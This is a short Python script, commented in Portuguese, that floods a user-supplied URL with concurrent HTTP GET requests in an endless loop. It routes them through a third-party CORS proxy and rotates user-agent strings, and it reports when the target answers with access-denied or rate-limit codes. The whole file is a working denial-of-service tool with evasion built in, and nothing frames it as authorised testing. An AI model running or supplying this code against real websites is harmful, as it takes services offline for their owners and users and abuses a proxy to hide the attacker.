import asyncio
import httpx
import random
from colorama import Fore, Style

# Lista de user-agents para rotação
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36"
]

# Envia uma requisição assíncrona
async def fetch(url, client):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = await client.get(url, headers=headers, timeout=10)
        status = response.status_code
        if status == 200:
            print(Fore.GREEN + f"HTTP 200 - OK" + Style.RESET_ALL)
        elif status in [403, 429]:
            print(Fore.RED + f"HTTP {status} - Acesso negado/Limite excedido" + Style.RESET_ALL)
        else:
            print(f"HTTP {status}")
        return status
    except Exception as e:
        print(Fore.RED + f"Erro: {e}" + Style.RESET_ALL)
        return None

# Gerencia as requisições concorrentes em loop infinito
async def send_requests(target_url, num_requests):
    url = f"https://corsproxy.io/?key=SUA-CHAVE&url={target_url}"
    async with httpx.AsyncClient() as client:
        while True:
            tasks = [fetch(url, client) for _ in range(num_requests)]
            await asyncio.gather(*tasks)

# Entrada do usuário
if __name__ == "__main__":
    target_url = input("Digite a URL de destino: ").strip()
    num_requests = input("Digite o número de requisições (padrão: 200): ").strip()
    num_requests = int(num_requests) if num_requests.isdigit() else 200 # Padrão

    asyncio.run(send_requests(target_url, num_requests))
